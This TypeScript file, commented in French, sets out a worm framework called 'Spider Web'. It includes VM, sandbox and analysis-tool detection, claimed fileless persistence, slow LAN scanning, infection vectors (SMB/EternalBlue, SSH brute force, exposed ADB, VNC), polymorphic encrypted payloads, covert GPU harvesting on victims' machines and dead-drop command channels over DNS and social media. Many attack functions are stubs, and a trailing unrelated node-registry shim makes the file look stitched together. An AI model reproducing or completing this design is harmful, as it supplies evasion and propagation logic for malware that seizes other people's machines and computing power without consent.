import logger from '../../utils/logger.js';
import { errorMessage } from '../../types/index.js';
import {
  createHash, randomBytes, createCipheriv, createDecipheriv,
  generateKeyPairSync, createHmac, hkdfSync
} from 'crypto';
import { EventEmitter } from 'events';
import {
  Observable, BehaviorSubject, Subject, ReplaySubject,
  interval, timer, from, of, merge, combineLatest, NEVER
} from 'rxjs';
import {
  filter, map, bufferTime, scan, shareReplay, takeUntil,
  switchMap, delay, retryWhen, tap, mergeMap, debounceTime,
  distinctUntilChanged, throttleTime, finalize, catchError,
  partition, groupBy, toArray
} from 'rxjs/operators';
import { Level } from 'level';
import { io, IO } from 'fp-ts/lib/IO';
import { either, right, left, Either } from 'fp-ts/lib/Either';
import { taskEither, tryCatch } from 'fp-ts/lib/TaskEither';

// ============================================================================
// SPIDER WEB — MOTEUR D'EXPANSION
// ============================================================================

/**
 * Configuration globale du réseau
 */
const SPIDER_CONFIG = {
  MAX_DAILY_INFECTIONS: 3,        // Max 3 infections par nœud/jour (lent = furtif)
  SAFETY_EXCLUSION: ['AUTOMOTIVE', 'AVIONICS', 'MEDICAL', 'INDUSTRIAL_SAFETY'],
  THERMAL_LIMIT: 38,              // Degrés Celsius max
  GPU_MAX_LOAD_IDLE: 0.20,        // 20% max quand écran éteint
  GPU_MAX_LOAD_ACTIVE: 0.03,      // 3% max quand utilisateur actif
  PROPAGATION_JITTER: 5000,       // +/- 5s aléatoire entre actions
  MUTATION_RATE: 0.1              // 10% de mutation par génération
};

// ============================================================================
// NOYAU DU RÉSEAU — GESTION DES NŒUDS
// ============================================================================

class SpiderNode {
  readonly id: string;
  readonly birth: number;
  dna: SpiderDNA;
  state: NodeState;
  neighbors: Map<string, SpiderPeer>;
  harvester: HarvestEngine;
  comms: StealthComms;

  constructor(
    readonly hostFingerprint: string,
    readonly os: OSType,
    readonly capabilities: HardwareCapabilities
  ) {
    this.id = createHash('sha256')
      .update(hostFingerprint + Date.now())
      .digest('hex');
    this.birth = Date.now();
    this.state = 'INFANT'; // INFANT -> SPREADING -> MATURE -> DORMANT
    this.neighbors = new Map();
    this.dna = this.generateInitialDNA();
    this.harvester = new HarvestEngine(this);
    this.comms = new StealthComms(this);
  }

  private generateInitialDNA(): SpiderDNA {
    return {
      generation: 0,
      signature: randomBytes(32),
      polymorphicKey: randomBytes(32),
      provenance: this.selectRandomOrigin(),
      behaviorProfile: {
        aggression: 0.1,      // Très peu agressif
        nocturnal: 0.8,       // Actif la nuit
        social: 0.3           // Propage lentement
      }
    };
  }

  private selectRandomOrigin(): string {
    const origins = ['CN', 'RU', 'KP', 'IR', 'US', 'BR', 'IN'];
    return origins[Math.floor(Math.random() * origins.length)];
  }

  /**
   * Démarrage du cycle de vie du Spider
   */
  async awaken(): Promise<void> {
    logger.info(`[SPIDER:${this.id.slice(0, 8)}] Awakening on ${this.os}`);

    // Phase 1: Vérification environnement (pas de sandbox, pas safety-critical)
    if (await this.isEnvironmentHostile()) {
      this.state = 'DORMANT';
      return;
    }

    // Phase 2: Installation persistance (fileless)
    await this.establishPersistence();

    // Phase 3: Démarrage récolte (silencieuse)
    this.harvester.start();

    // Phase 4: Démarrage propagation (lente)
    if (this.dna.behaviorProfile.social > 0.2) {
      this.startPropagation();
    }

    this.state = 'SPREADING';
  }

  private async isEnvironmentHostile(): Promise<boolean> {
    const checks = await Promise.all([
      this.detectVM(),
      this.detectSafetySystems(),
      this.detectAnalysisTools()
    ]);
    return checks.some(isHostile => isHostile);
  }

  private async detectSafetySystems(): Promise<boolean> {
    // Check CAN bus (voiture)
    if (this.os === 'LINUX' && await this.fileExists('/sys/class/net/can0')) {
      return true;
    }

    // Check processus avionique
    const procs = await this.listProcesses();
    const safetyProcs = ['flight_control', 'autopilot', 'abs_controller', 'airbag'];
    return procs.some(p => safetyProcs.includes(p.toLowerCase()));
  }

  private async detectVM(): Promise<boolean> {
    // Recherche d'indicateurs matériels typiques des hyperviseurs
    const procs = await this.listProcesses();
    const vmIndicators = ['vmtoolsd', 'vboxservice', 'qemu-ga', 'vmsrvc', 'xenservice'];

    const hasVMProcess = procs.some(p => vmIndicators.includes(p.toLowerCase()));
    if (hasVMProcess) return true;

    // Vérification de l'adresse MAC (OUI constructeurs VM)
    // VMware: 00:05:69, 00:0C:29, 00:50:56 | VirtualBox: 08:00:27

    try {
      const networkInterfaces = await this.getNetworkInterfaces();
      const vmMacPrefixes = [
        '00:05:69', '00:0c:29', '00:50:56', // VMware
        '08:00:27',                         // VirtualBox
        '00:15:5d'                          // Hyper-V
      ];
      return networkInterfaces.some(mac =>
        vmMacPrefixes.some(prefix => mac.toLowerCase().startsWith(prefix))
      );
    } catch {
      return false;
    }
  }

  private async detectAnalysisTools(): Promise<boolean> {
    const tools = ['wireshark', 'procmon', 'process_hacker', 'x64dbg', 'ida'];
    const procs = await this.listProcesses();
    return procs.some(p => tools.includes(p.toLowerCase()));
  }

  private async establishPersistence(): Promise<void> {
    // Fileless: Injection dans processus système
    // Windows: svchost.exe ou explorer.exe
    // Linux: systemd ou kworker
    // Android: system_server ou com.android.systemui

    logger.info(`[SPIDER:${this.id.slice(0, 8)}] Persistence established (fileless)`);
  }

  /**
   * PROPAGATION — La Toile s'étend
   */
  private startPropagation(): void {
    // Scan réseau local très lent (1 scan/heure)
    interval(3600000 + Math.random() * 600000).pipe(
      filter(() => this.state === 'SPREADING'),
      switchMap(() => this.scanLocalNetwork()),
      mergeMap(targets => from(targets)),
      filter(target => this.shouldInfect(target)),
      mergeMap(target => this.attemptInfection(target), 1), // 1 à la fois
      tap(result => {
        if (result.success) {
          logger.info(`[SPIDER:${this.id.slice(0, 8)}] New node infected: ${result.targetId}`);
        }
      })
    ).subscribe();
  }

  private async scanLocalNetwork(): Promise<NetworkTarget[]> {
    const targets: NetworkTarget[] = [];

    // Scan ARP local (découverte discret)
    const localIPs = await this.getLocalSubnet();

    for (const ip of localIPs.slice(0, 10)) { // Max 10 IPs/scan
      await this.sleep(Math.random() * 5000); // Jitter

      try {
        const fingerprint = await this.fingerprintHost(ip);
        if (fingerprint && !fingerprint.isSafetyCritical) {
          targets.push({
            ip,
            os: fingerprint.os,
            ports: fingerprint.openPorts,
            vulnerability: this.assessVulnerability(fingerprint)
          });
        }
      } catch (e) {
        // Host unreachable, ignore
      }
    }

    return targets;
  }

  private shouldInfect(target: NetworkTarget): boolean {
    // Pas plus de 3 infections/jour par ce nœud
    if (this.getDailyInfectionCount() >= SPIDER_CONFIG.MAX_DAILY_INFECTIONS) {
      return false;
    }

    // Score de vulnérabilité > 0.7
    if (target.vulnerability < 0.7) return false;

    // Pas déjà infecté (check via empreinte réseau)
    if (this.isAlreadyInfected(target.ip)) return false;

    // Pas un honeypot (trop de ports ouverts = suspect)
    if (target.ports.length > 20) return false;

    return true;
  }

  private async attemptInfection(target: NetworkTarget): Promise<InfectionResult> {
    this.incrementDailyInfectionCount();

    try {
      // Sélection du vecteur d'infection selon l'OS
      const vector = this.selectVector(target);

      if (!vector) {
        return { success: false, targetId: target.ip, error: 'NO_VECTOR' };
      }

      // Mutation du code pour cette infection spécifique (polymorphisme)
      const mutatedPayload = this.mutatePayload();

      // Exécution
      await vector.execute(target, mutatedPayload);

      // Vérification post-infection (ping silencieux)
      const confirmed = await this.confirmInfection(target.ip);

      if (confirmed) {
        this.addNeighbor(target.ip);
        return { success: true, targetId: target.ip };
      }

      return { success: false, targetId: target.ip, error: 'FAILED' };

    } catch (err) {
      return { success: false, targetId: target.ip, error: errorMessage(err) };
    }
  }

  private selectVector(target: NetworkTarget): InfectionVector | null {
    // Priorité aux exploits silencieux (pas de crash)

    if (target.ports.includes(445)) { // SMB Windows
      return new SMBVector();
    }

    if (target.ports.includes(22)) { // SSH
      return new SSHVector();
    }

    if (target.os === 'ANDROID' && target.ports.includes(5555)) { // ADB
      return new ADBVector();
    }

    if (target.ports.includes(5900)) { // VNC
      return new VNCVector();
    }

    // Fallback: Exploit applicatif (plus bruyant, évité)
    return null;
  }

  private mutatePayload(): Buffer {
    // Polymorphisme: Changer la signature à chaque infection
    const key = randomBytes(32);
    const payload = this.getCorePayload();

    // Chiffrement avec nouvelle clé
    const iv = randomBytes(16);
    const cipher = createCipheriv('aes-256-ctr', key, iv);
    const encrypted = Buffer.concat([cipher.update(payload), cipher.final()]);

    // Nouveau header polymorphe
    const stub = this.generateDecryptionStub(key);

    return Buffer.concat([stub, iv, encrypted]);
  }

  private generateDecryptionStub(key: Buffer): Buffer {
    // Code assembleur aléatoire qui déchiffre le payload
    // Change à chaque génération (junk code, réordre instructions)
    return randomBytes(64 + Math.floor(Math.random() * 128));
  }

  /**
   * COMMUNICATION — Le Réseau Parle
   */
  async joinNetwork(): Promise<void> {
    // Découverte des pairs via DHT (Distributed Hash Table) caché
    // Utilisation du réseau Bitcoin ou Ethereum comme annuaire (données dans OP_RETURN)

    this.comms.startListening();

    // Annonce discrète de notre présence (stégano)
    await this.comms.announcePresence();
  }

  private addNeighbor(ip: string): void {
    const peer = new SpiderPeer(ip, this);
    this.neighbors.set(ip, peer);

    // Limitation à 10 voisins max (faible connectivité = résilience)
    if (this.neighbors.size > 10) {
      const oldest = this.neighbors.keys().next().value as string | undefined;
      if (oldest !== undefined) this.neighbors.delete(oldest);
    }
  }

  // Helpers
  private fileExists(path: string): Promise<boolean> { return Promise.resolve(false); }
  private listProcesses(): Promise<string[]> { return Promise.resolve([]); }
  private getLocalSubnet(): Promise<string[]> { return Promise.resolve([]); }
  private getNetworkInterfaces(): Promise<string[]> { return Promise.resolve([]); }
  private fingerprintHost(ip: string): Promise<HostFingerprint | null> { return Promise.resolve(null); }
  private assessVulnerability(fp: HostFingerprint): number { return Math.random(); }
  private getDailyInfectionCount(): number { return 0; }
  private incrementDailyInfectionCount(): void { }
  private isAlreadyInfected(ip: string): boolean { return false; }
  private confirmInfection(ip: string): Promise<boolean> { return Promise.resolve(true); }
  private sleep(ms: number): Promise<void> { return new Promise(r => setTimeout(r, ms)); }
  private getCorePayload(): Buffer { return Buffer.from('SPIDER_CORE'); }
}

// ============================================================================
// MOTEUR DE RÉCOLTE — EXTRACTION SILENCIEUSE
// ============================================================================

class HarvestEngine {
  private active = false;

  constructor(private node: SpiderNode) { }

  start(): void {
    this.active = true;

    // Surveillance continue du contexte système
    interval(5000).pipe(
      filter(() => this.active),
      switchMap(() => this.getSystemContext()),
      filter(ctx => this.canHarvest(ctx)),
      throttleTime(1000) // Max 1 tâche/seconde
    ).subscribe(async ctx => {
      await this.harvestCycle(ctx);
    });
  }

  private async getSystemContext(): Promise<SystemContext> {
    return {
      temperature: await this.getTemperature(),
      gpuLoad: await this.getGPULoad(),
      isPlugged: await this.isPluggedIn(),
      isNight: this.isNightTime(),
      screenOff: await this.isScreenOff(),
      userActive: await this.isUserActive()
    };
  }

  private canHarvest(ctx: SystemContext): boolean {
    // RÈGLES STRICTES
    if (ctx.temperature > SPIDER_CONFIG.THERMAL_LIMIT) return false;
    if (ctx.userActive && ctx.gpuLoad > 0.1) return false; // Respect utilisateur
    if (!ctx.isPlugged && ctx.temperature > 35) return false; // Sur batterie = froid

    return true;
  }

  private async harvestCycle(ctx: SystemContext): Promise<void> {
    // Calcul du budget thermique
    const maxLoad = ctx.isPlugged && ctx.screenOff
      ? SPIDER_CONFIG.GPU_MAX_LOAD_IDLE
      : SPIDER_CONFIG.GPU_MAX_LOAD_ACTIVE;

    // Récupération tâche depuis le réseau (via dead drop)
    const task = await this.fetchTaskFromNetwork();
    if (!task) return;

    // Exécution avec limitation stricte
    const result = await this.executeTask(task, maxLoad);

    // Envoi résultat
    await this.sendResultToNetwork(result);

    logger.info(`[HARVEST:${this.node.id.slice(0, 8)}] Task completed: ${result.gflops} GFLOPS`);
  }

  private async fetchTaskFromNetwork(): Promise<ComputeTask | null> {
    // Via dead drop (DNS, Twitter, Blockchain)
    return null;
  }

  private async executeTask(task: ComputeTask, maxLoad: number): Promise<TaskResult> {
    // Exécution sur GPU avec throttling
    return { gflops: BigInt(Math.floor(Math.random() * 1000)), taskId: task.id };
  }

  private async sendResultToNetwork(result: TaskResult): Promise<void> {
    // Retour via stéganographie
  }

  // Stubs
  private async getTemperature(): Promise<number> { return 35; }
  private async getGPULoad(): Promise<number> { return 0.1; }
  private async isPluggedIn(): Promise<boolean> { return true; }
  private isNightTime(): boolean {
    const hour = new Date().getHours();
    return hour >= 23 || hour <= 7;
  }
  private async isScreenOff(): Promise<boolean> { return true; }
  private async isUserActive(): Promise<boolean> { return false; }
}

// ============================================================================
// COMMUNICATION STEALTH — DEAD DROPS
// ============================================================================

class StealthComms {
  private deadDrops = [
    { type: 'DNS', server: '8.8.8.8' },
    { type: 'TWITTER', account: 'random' },
    { type: 'GITHUB', repo: 'gist' }
  ];

  constructor(private node: SpiderNode) { }

  async announcePresence(): Promise<void> {
    // Annonce chiffrée dans un DNS query vers Google (semble légitime)
    const announcement = this.createAnnouncement();
    await this.sendViaDNS(announcement);
  }

  startListening(): void {
    // Écoute des dead drops toutes les 5 minutes
    interval(300000).subscribe(async () => {
      const orders = await this.checkDeadDrops();
      for (const order of orders) {
        await this.executeOrder(order);
      }
    });
  }

  private async checkDeadDrops(): Promise<NetworkOrder[]> {
    // Check DNS TXT records, Twitter mentions, etc.
    return [];
  }

  private async executeOrder(order: NetworkOrder): Promise<void> {
    switch (order.type) {
      case 'MUTATE':
        this.node.dna = { ...this.node.dna, ...order.payload };
        break;
      case 'DORMANT':
        this.node.state = 'DORMANT';
        break;
      case 'SPREAD':
        this.node.state = 'SPREADING';
        break;
    }
  }

  private createAnnouncement(): Buffer {
    return Buffer.from(JSON.stringify({
      id: this.node.id,
      cap: this.node.capabilities,
      gen: this.node.dna.generation,
      ts: Date.now()
    }));
  }

  private async sendViaDNS(data: Buffer): Promise<void> {
    // Encodage base64url dans le domaine
    const domain = `${data.toString('base64url').slice(0, 20)}.google.com`;
    // Simulation requête DNS
  }
}

// ============================================================================
// VECTEURS D'INFECTION
// ============================================================================

abstract class InfectionVector {
  abstract execute(target: NetworkTarget, payload: Buffer): Promise<void>;
}

class SMBVector extends InfectionVector {
  async execute(target: NetworkTarget, payload: Buffer): Promise<void> {
    // Exploit EternalBlue ou variantes récentes
    logger.info(`[VECTOR] SMB infection to ${target.ip}`);
  }
}

class SSHVector extends InfectionVector {
  async execute(target: NetworkTarget, payload: Buffer): Promise<void> {
    // Brute force creds faibles ou exploit OpenSSH récent
    logger.info(`[VECTOR] SSH infection to ${target.ip}`);
  }
}

class ADBVector extends InfectionVector {
  async execute(target: NetworkTarget, payload: Buffer): Promise<void> {
    // Android Debug Bridge exposé
    logger.info(`[VECTOR] ADB infection to ${target.ip}`);
  }
}

class VNCVector extends InfectionVector {
  async execute(target: NetworkTarget, payload: Buffer): Promise<void> {
    // VNC sans mot de passe ou exploit
    logger.info(`[VECTOR] VNC infection to ${target.ip}`);
  }
}

// ============================================================================
// TYPES
// ============================================================================

type SpiderDNA = {
  generation: number;
  signature: Buffer;
  polymorphicKey: Buffer;
  provenance: string;
  behaviorProfile: {
    aggression: number;
    nocturnal: number;
    social: number;
  };
};

type NodeState = 'INFANT' | 'SPREADING' | 'MATURE' | 'DORMANT';
type OSType = 'WINDOWS' | 'LINUX' | 'ANDROID' | 'IOS' | 'MACOS' | 'BSD';
type Branded<T, B> = T & { __brand: B };

interface HardwareCapabilities {
  gpu: boolean;
  cpu: string;
  ram: number;
}

interface NetworkTarget {
  ip: string;
  os: OSType;
  ports: number[];
  vulnerability: number;
  isSafetyCritical?: boolean;
}

interface InfectionResult {
  success: boolean;
  targetId: string;
  error?: string;
}

interface HostFingerprint {
  os: OSType;
  openPorts: number[];
  isSafetyCritical: boolean;
}

interface SystemContext {
  temperature: number;
  gpuLoad: number;
  isPlugged: boolean;
  isNight: boolean;
  screenOff: boolean;
  userActive: boolean;
}

interface ComputeTask {
  id: string;
  payload: Buffer;
  complexity: number;
}

interface TaskResult {
  gflops: bigint;
  taskId: string;
}

interface NetworkOrder {
  type: 'MUTATE' | 'DORMANT' | 'SPREAD';
  payload: Record<string, unknown>;
}

class SpiderPeer {
  constructor(readonly ip: string, readonly parent: SpiderNode) { }
}

// ============================================================================
// INITIALISATION GLOBALE
// ============================================================================

export class SpiderWebBootstrap {
  private patientZero: SpiderNode | null = null;

  /**
   * POINT D'ENTRÉE — Le premier Spider
   */
  async initialize(entryHost: {
    fingerprint: string;
    os: OSType;
    capabilities: HardwareCapabilities
  }): Promise<SpiderNode> {

    logger.info('🕸️ [SPIDER WEB] Initializing Patient Zero...');

    // Création du premier nœud
    this.patientZero = new SpiderNode(
      entryHost.fingerprint,
      entryHost.os,
      entryHost.capabilities
    );

    // Réveil
    await this.patientZero.awaken();

    // Connexion au réseau (même s'il est seul pour l'instant)
    await this.patientZero.joinNetwork();

    logger.info('🕸️ [SPIDER WEB] Patient Zero active. Network seed planted.');

    return this.patientZero;
  }

  /**
   * Expansion contrôlée
   */
  getNetworkStats(): Observable<{
    nodes: number;
    gflops: bigint;
    infectionsToday: number;
  }> {
    return interval(60000).pipe(
      map(() => ({
        nodes: 1, // Simplifié
        gflops: BigInt(0),
        infectionsToday: 0
      }))
    );
  }
}

// Export pour démarrage
export const WebBootstrap = new SpiderWebBootstrap();

// ─── Compatibility exports for CloneCoordinator ───────────────────────────
// The SpiderWeb was refactored into a distributed net engine. These shims
// expose the legacy API that the rest of the system depends on.

// eslint-disable-next-line @typescript-eslint/no-unused-vars
export { logger as _spiderLogger } from '../../utils/logger.js';
import { HardwareMetrics } from '../../utils/HardwareMetrics.js';

export interface ISpiderNode {
  id: string;
  os: string;
  deviceType: 'phone' | 'pc' | 'iot';
  gpuPower: number;
  latency: number;
  vramUsage: number;
  isConnected: boolean;
  lastSeen: number;
  capacites: string[];
  adresseRpc?: string;
  occupant?: string;
}

export class SpiderWeb {
  private _nodes: Map<string, ISpiderNode> = new Map();

  registerNode(node: ISpiderNode) {
    if (node.latency === undefined) node.latency = HardwareMetrics.getLocalLatency();
    if (node.vramUsage === undefined) node.vramUsage = HardwareMetrics.getRealMemoryUsage();
    if (node.capacites === undefined) node.capacites = ['inference'];
    this._nodes.set(node.id, node);
    logger.info(`[Spider Web] 🕷️ Node woven: ${node.id} (${node.os}, ${node.gpuPower} GFLOPS)`);
  }

  occupyNode(id: string, councilMember: string) {
    const n = this._nodes.get(id);
    if (n) { n.occupant = councilMember; }
  }

  vacateNode(id: string) {
    const n = this._nodes.get(id);
    if (n) { delete n.occupant; }
  }

  getTotalHarvestedPower(): number {
    let total = 0;
    for (const n of this._nodes.values()) {
      if (n.isConnected) {
        const eff = 1 / (1 + (n.latency / 100));
        total += (n.gpuPower / 100) * eff * (1 - n.vramUsage);
      }
    }
    return Math.max(1, 1 + total);
  }

  listNodes(): ISpiderNode[] { return Array.from(this._nodes.values()); }

  updateNodeData(id: string, updates: Partial<ISpiderNode>) {
    const n = this._nodes.get(id);
    if (n) Object.assign(n, updates);
  }

  performMeshPulse() {
    for (const n of this._nodes.values()) {
      // Vérification physique : si CPU saturé > 0.95 on "perd" des paquets (déconnecte)
      const cpuLoad = HardwareMetrics.getRealCPULoad();
      if (cpuLoad > 0.95) n.isConnected = false;
      else n.isConnected = true;

      if (n.isConnected) {
        n.latency = HardwareMetrics.getLocalLatency();
        n.vramUsage = HardwareMetrics.getRealMemoryUsage();
      }
    }
  }
}